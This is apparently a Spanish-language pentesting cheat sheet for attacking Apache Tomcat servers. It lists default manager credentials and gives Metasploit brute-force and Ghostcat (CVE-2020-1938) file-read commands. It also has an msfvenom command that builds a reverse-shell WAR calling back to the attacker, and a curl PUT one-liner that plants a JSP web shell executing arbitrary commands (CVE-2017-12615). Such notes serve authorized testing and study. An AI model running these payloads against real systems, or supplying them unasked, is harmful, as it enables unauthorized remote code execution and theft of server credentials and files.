---
title: Apache Tomcat (Puerto 8080 / 8009)
pubDate: '2025-11-26'
---

## ¿Qué es Apache Tomcat?
**Apache Tomcat** es un servidor de aplicaciones Java y contenedor de servlets. Es muy común en infraestructuras corporativas para desplegar aplicaciones web complejas. A menudo se le encuentra en el puerto **8080** (HTTP) y el **8009** (protocolo AJP).

### Riesgos principales
1.  **Panel de Administración Expuesto:** Si `/manager/html` es accesible, permite subir aplicaciones maliciosas (.war) para obtener RCE.
2.  **Credenciales por Defecto:** Instalaciones mal configuradas suelen usar combinaciones simples como `admin:admin`.
3.  **Vulnerabilidad Ghostcat (AJP):** El puerto 8009 permite leer archivos del servidor sin estar autenticado.
4.  **Subida de Archivos via PUT:** Si el método HTTP PUT está habilitado, se pueden inyectar archivos JSP.

---

## 🔎 Enumeración Inicial
Identifica las rutas críticas del servidor.

*   **Rutas clave:**
    *   `/manager/html` (Punto principal de entrada para RCE)
    *   `/host-manager/html` (Gestión de virtual hosts)
    *   `/examples/` (Revela versiones y comportamiento del servidor)

---

## 🔑 Credenciales y Fuerza Bruta
Prueba combinaciones típicas en el panel `/manager/html`:
* `tomcat : tomcat`
* `admin : admin`
* `admin : tomcat`
* `admin : (vacío)`
* `root : password`

### Fuerza Bruta (Metasploit)
```bash
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <IP>
set RPORT 8080
run
```

---

## 🚀 RCE: Subida de WAR Malicioso (Requiere Credenciales)
Si tienes acceso al panel Manager, puedes desplegar tu propia aplicación Java.

**1. Generar Payload con Msfvenom:**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP_KALI> LPORT=4444 -f war -o shell.war
```
**2. Subir:** Usa la sección "WAR file to deploy" en el panel.
**3. Ejecutar:** Visita `http://<IP>:8080/shell/` para activar la conexión reversa.

---

## 👻 Ghostcat (CVE-2020-1938)
Si el puerto **8009 (AJP)** está abierto, se puede explotar una vulnerabilidad en el protocolo para leer archivos sensibles como el `WEB-INF/web.xml`, que suele contener contraseñas.

```bash
# Usando Metasploit
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS <IP>
run
```

---

## ⚠️ Otros Vectores (Configuración Errónea)

### CVE-2017-12615 (HTTP PUT Method)
Si el parámetro `readonly` está configurado como `false`, se pueden subir archivos JSP directamente.
```bash
# Ejemplo de subida manual (Truco del "/" al final para saltar filtros)
curl -X PUT http://<IP>:8080/shell.jsp/ -d '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
```
